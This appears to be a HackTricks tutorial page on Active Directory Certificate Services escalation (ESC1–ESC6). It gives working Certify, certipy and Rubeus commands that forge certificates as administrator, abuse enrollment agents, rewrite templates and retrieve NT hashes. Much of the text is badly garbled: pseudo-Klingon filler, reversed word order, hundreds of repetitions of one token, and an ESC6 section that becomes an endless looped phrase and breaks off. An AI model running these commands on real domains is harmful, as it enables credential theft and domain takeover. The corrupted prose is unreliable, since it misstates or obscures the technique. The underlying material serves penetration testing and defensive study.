# AD CS Domain Escalation

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**This is a summary of escalation technique sections of the posts:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

* **Enrolment rights are granted to low-privileged users by the Enterprise CA.**
* **Manager approval is not required.**
* **No signatures from authorized personnel are needed.**
* **Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain enrolment rights.**
* **Certificate templates are configured to define EKUs that facilitate authentication:**
* Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
* **The ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template:**
* The Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present. This means that by specifying the SAN in a CSR, a certificate can be requested to impersonate any user (e.g., a domain administrator). Whether a SAN can be specified by the requester is indicated in the certificate template's AD object through the `mspki-certificate-name-flag` property. This property is a bitmask, and the presence of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag permits the specification of the SAN by the requester.

{% hint style="danger" %}
The configuration outlined permits low-privileged users to request certificates with any SAN of choice, enabling authentication as any domain principal through Kerberos or SChannel.
{% endhint %}

This feature is sometimes enabled to support the on-the-fly generation of HTTPS or host certificates by products or deployment services, or due to a lack of understanding.

It is noted that creating a certificate with this option triggers a warning, which is not the case when an existing certificate template (such as the `WebServer` template, which has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled) is duplicated and then modified to include an authentication OID.

### Abuse

To **find vulnerable certificate templates** you can run:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**ghItlh** **vulnerability** **vaj** **administrator** **ghItlh** **impersonate** **'ej** **run** **'e'** **could**.
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
**DaH jImej certificate** **.pfx** **format** **ghItlh** **'ej Rubeus** **certipy** **vaj** **authenticate** **ghItlh** **vaj** **'e'** **DIvI'**.
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binaries "Certreq.exe" & "Certutil.exe" can be used to generate the PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

The enumeration of certificate templates within the AD Forest's configuration schema, specifically those not necessitating approval or signatures, possessing a Client Authentication or Smart Card Logon EKU, and with the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled, can be performed by running the following LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

The second abuse scenario is a variation of the first one:

1. Enrollment rights are granted to low-privileged users by the Enterprise CA.
2. The requirement for manager approval is disabled.
3. The need for authorized signatures is omitted.
4. An overly permissive security descriptor on the certificate template grants certificate enrollment rights to low-privileged users.
5. **The certificate template is defined to include the Any Purpose EKU or no EKU.**

The **Any Purpose EKU** permits a certificate to be obtained by an attacker for **any purpose**, including client authentication, server authentication, code signing, etc. The same **technique used for ESC3** can be employed to exploit this scenario.

Certificates with **no EKUs**, which act as subordinate CA certificates, can be exploited for **any purpose** and can **also be used to sign new certificates**. Hence, an attacker could specify arbitrary EKUs or fields in the new certificates by utilizing a subordinate CA certificate.

However, new certificates created for **domain authentication** will not function if the subordinate CA is not trusted by the **`NTAuthCertificates`** object, which is the default setting. Nonetheless, an attacker can still create **new certificates with any EKU** and arbitrary certificate values. These could be potentially **abused** for a wide range of purposes (e.g., code signing, server authentication, etc.) and could have significant implications for other applications in the network like SAML, AD FS, or IPSec.

To enumerate templates that match this scenario within the AD Forest’s configuration schema, the following LDAP query can be run:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

**QaStaHvIS** scenario **vItlhutlh** 'ej **cha'logh** **EKU** (Certificate Request Agent) **'ej 2 template** **'ej 2 sets of requirements** **'abusing**.

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1) **Enrollment Agent** **Microsoft documentation** **known** **principal** **certificate** **enroll** **user** **behalf** **allows**.

**"enrollment agent"** **template** **enrolls** **certificate** **co-sign** **CSR** **user** **behalf** **uses** **resulting** **CA** **co-signed CSR** **sends** **enrolling** **template** **"enroll on behalf of"** **permits** **certificate belong** **CA** **responds**.

**Requirements 1:**

- **Enrollment rights** **low-privileged users** **granted** **Enterprise CA**.
- **manager approval** **omitted**.
- **authorized signatures** **requirement** **No**.
- **certificate template** **security descriptor** **excessively permissive**, **enrollment rights** **low-privileged users** **granting**.
- **Certificate Request Agent EKU** **includes** **certificate template**, **request** **certificate templates** **behalf** **principals** **other** **enabling**.

**Requirements 2:**

- **Enterprise CA** **enrollment rights** **low-privileged users** **grants**.
- **Manager approval** **bypassed**.
- **template's schema version** **1** **exceeds 2**, **Application Policy Issuance Requirement** **specifies** **Certificate Request Agent EKU** **necessitates**.
- **certificate template** **EKU** **defined** **permits** **domain authentication**.
- **enrollment agents** **restrictions** **applied** **CA** **not**.

### Abuse

[**Certify**](https://github.com/GhostPack/Certify) **Certipy** **abuse** **scenario** **use**.
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**users** vItlhutlh **obtain** **enrollment agent certificate** **allowed** **agents** **enroll** **templates**, **accounts** **enrollment agent** **act** **enterprise CAs** **constrain**. **certsrc.msc** **snap-in** **opening** **achieve** **clicking Properties**, **CA** **right-clicking**, **navigating** “Enrollment Agents” tab.

**default** **CAs** **setting** “**Do not restrict enrollment agents**.” **restriction** **enrollment agents** **enabled** **administrators**, **setting** “Restrict enrollment agents,” **configuration** **default** **permissive** **remains**. **Everyone** **access** **allows** **templates** **enroll** **anyone**.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

**certificate templates** **security descriptor** **defines** **permissions** **AD principals** **possess** **template**.

**attacker** **permissions** **possess** **alter** **template** **institute** **exploitable misconfigurations** **outlined** **prior sections**, **privilege escalation** **facilitated** **could**.

**certificate templates** **permissions** **applicable** **Notable** **include**:

- **Owner:** **object** **control** **implicit** **Grants**, **attributes** **any** **modification** **the**.
- **FullControl:** **object** **authority** **complete** **Enables**, **attributes** **any** **alter** **capability**.
- **WriteOwner:** **principal** **attacker's** **under** **control** **attacker** **a** **owner** **object's** **alter** **Permits**.
- **WriteDacl:** **controls** **access** **adjustment** **for** **Allows**, **FullControl** **attacker** **granting** **potentially**.
- **WriteProperty:** **properties** **object** **editing** **Authorizes**.

### Abuse

**privesc** **previous** **like** **example**:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

**ESC4** **certificate template** **write privileges** **user** **when** **vulnerable** **template** **configuration** **overwrite** **abused** **instance** **make** **template** **vulnerable** **ESC1**.

**path** **above** **see**, **privileges** `JOHNPC` **only**, **user** `JOHN` **user** **new** `AddKeyCredentialLink` **edge** `JOHNPC` **has**. **technique** **related** **certificates**, **attack** **implemented** **well**, **known** **[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)**. **Certipy’s** `shadow auto` **command** **victim** **NT hash** **retrieve** **to** **sneak peak** **Here’s**.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** vItlhutlhla' certificate template configuration vItlhutlhla' vItlhutlhla' command. **Default** Certipy vItlhutlhla' vItlhutlhla' configuration **vulnerable to ESC1**. **`-save-old` parameter vItlhutlhla' **configuration vItlhutlhla' restore** vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

**QaStaHvIS** AD CS system vItlhutlh **security** impact **objects** certificate templates **certificate authority** beyond **relationships** ACL-based **interconnected** web of **extensive** The. **objects** security **affect** significantly can which, **system** CS AD the of **security** the impact can objects these encompass:

* **server** CA object computer AD The, **mechanisms** S4U2Self or S4U2Proxy like through compromised be may server CA the of.
* **server** CA DCOM/RPC The.
* **container** specific the within **object** AD descendant any or **object** AD. `CN=<DOMAIN>,DC=<COM>`, `CN=Configuration,CN=Services,CN=Public Key Services` path container, Templates Certificate the as such objects and containers, limited not is path This.

**components** critical these of control gain to manages attacker low-privileged a if compromised be can system PKI the.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

**Microsoft** by outlined as **implications** flag's **`EDITF_ATTRIBUTESUBJECTALTNAME2`** the on touches also post Academy CQure **subject** the in discussed **configuration** This. (CA) Authority Certification a on activated when, **request** any in **values user-defined** the **inclusion** permits that, **CA** Certification a on activated when **configuration** This. **Directory® Active** from constructed those including, **request** **alternative name** **subject** the in **values user-defined** the **inclusion** permits that, **CA** Certification a on activated when **configuration** This. **enrollment** user **unprivileged** to open those specifically—authentication domain for **template** any through **enroll** to **intruder** an allows Consequently. **template** User standard the like, enrollment user **unprivileged** to open those specifically—authentication domain for **template** any through **enroll** to **intruder** an allows Consequently. **domain** the within **entity** active other **any** or **administrator** domain a as authenticate to **intruder** the enabling, **certificate** a secured be can. **domain** the within **entity** active other **any** or **administrator** domain a as authenticate to **intruder** the enabling, **certificate** a secured be can.

**Note**: **Request** Signing Certificate a into **names alternative** **appending** for **approach** The (referred to as “Name Value Pairs”), `certreq.exe` in `argument` `-attrib "SAN:"` the through **CSR** Requesting Signing Certificate a into **names alternative** **appending** for **approach** The (referred to as “Name Value Pairs”), `certreq.exe` in `argument` `-attrib "SAN:"` the through **CSR** **encapsulated** is information **account** how **lies** distinction the Here. **extension** an than attribute certificate a within—**encapsulated** information account how **lies** distinction the Here. **extension** an than attribute certificate a within—**encapsulated** information account how **lies** distinction the Here.

### Abuse

`certutil.exe` with command following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the 